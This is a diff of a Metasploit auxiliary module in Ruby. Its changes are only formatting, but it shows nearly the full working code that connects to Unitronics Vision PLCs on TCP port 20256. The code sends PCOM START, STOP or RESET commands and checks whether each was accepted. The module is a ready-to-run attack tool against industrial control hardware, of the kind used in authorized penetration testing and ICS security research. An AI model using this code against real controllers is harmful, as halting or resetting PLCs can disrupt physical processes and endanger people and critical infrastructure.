@@ -4,41 +4,37 @@
 ##
 
 class MetasploitModule < Msf::Auxiliary
+
   include Msf::Exploit::Remote::Tcp
   include Rex::Socket::Tcp
   include Rex::Text
 
   def initialize(info = {})
     super(update_info(info,
-                      'Name'          => 'Unitronics PCOM remote START/STOP/RESET command',
-                      'Description'   => %q{
+      'Name'          => 'Unitronics PCOM remote START/STOP/RESET command',
+      'Description'   => %q{
         Unitronics Vision PLCs allow remote administrative functions to control
         the PLC using authenticated PCOM commands.
+
         This module supports START, STOP and RESET operations.
-                      },
-                        'Author'         =>
-                      [
-                        'Luis Rosa <lmrosa[at]dei.uc.pt>'
-                      ],
-                      'License'        => MSF_LICENSE,
-                      'References'     =>
-                      [
-                        [ 'URL', 'https://unitronicsplc.com/Download/SoftwareUtilities/Unitronics%20PCOM%20Protocol.pdf' ]
-                      ],
-                     ))
+      },
+      'Author'        =>
+        [
+          'Luis Rosa <lmrosa[at]dei.uc.pt>'
+        ],
+      'License'       => MSF_LICENSE,
+      'References'    =>
+        [
+          [ 'URL', 'https://unitronicsplc.com/Download/SoftwareUtilities/Unitronics%20PCOM%20Protocol.pdf' ]
+        ],
+     ))
+
     register_options(
       [
-        OptEnum.new("MODE", [true, 'PLC command', "RESET",
-                             [
-                               "START",
-                               "STOP",
-                               "RESET",
-        ]
-      ]),
-      Opt::RPORT(20256),
-      OptInt.new('UNITID', [ false, 'Unit ID (0 - 127)', 0]),
+        OptEnum.new('MODE', [true, 'PLC command', 'RESET', ['START', 'STOP', 'RESET']]),
+        Opt::RPORT(20256),
+        OptInt.new('UNITID', [ false, 'Unit ID (0 - 127)', 0]),
       ])
-
   end
 
   # compute and return the checksum of a PCOM ASCII message
@@ -50,7 +46,6 @@ class MetasploitModule < Msf::Auxiliary
   def pcom_ascii_len(pcom_ascii)
     Rex::Text.hex_to_raw(pcom_ascii.length.to_s(16).rjust(4,'0').unpack('H4H4').reverse.pack('H4H4'))
   end
-
 
   # return a pcom ascii formatted request
   def pcom_ascii_request(command)
@@ -74,14 +69,14 @@ class MetasploitModule < Msf::Auxiliary
   def run
     connect
     case datastore['MODE']
-    when "START"
-      print_status "Sending START command"
+    when 'START'
+      print_status 'Sending START command'
       ascii_code = "\x43\x43\x52" # CCR
-    when "STOP"
-      print_status "Sending STOP command"
+    when 'STOP'
+      print_status 'Sending STOP command'
       ascii_code = "\x43\x43\x53" # CCS
-    when "RESET"
-      print_status "Sending RESET command"
+    when 'RESET'
+      print_status 'Sending RESET command'
       ascii_code = "\x43\x43\x45" # CCE
     else
       print_error "Unknown MODE"
@@ -90,8 +85,8 @@ class MetasploitModule < Msf::Auxiliary
 
     sock.put(pcom_ascii_request(ascii_code)) #
     ans = sock.get_once
-    if ans.to_s[10,2] == "CC"
-      print_status "Command accepted"
+    if ans.to_s[10,2] == 'CC'
+      print_status 'Command accepted'
     end
     disconnect
   end
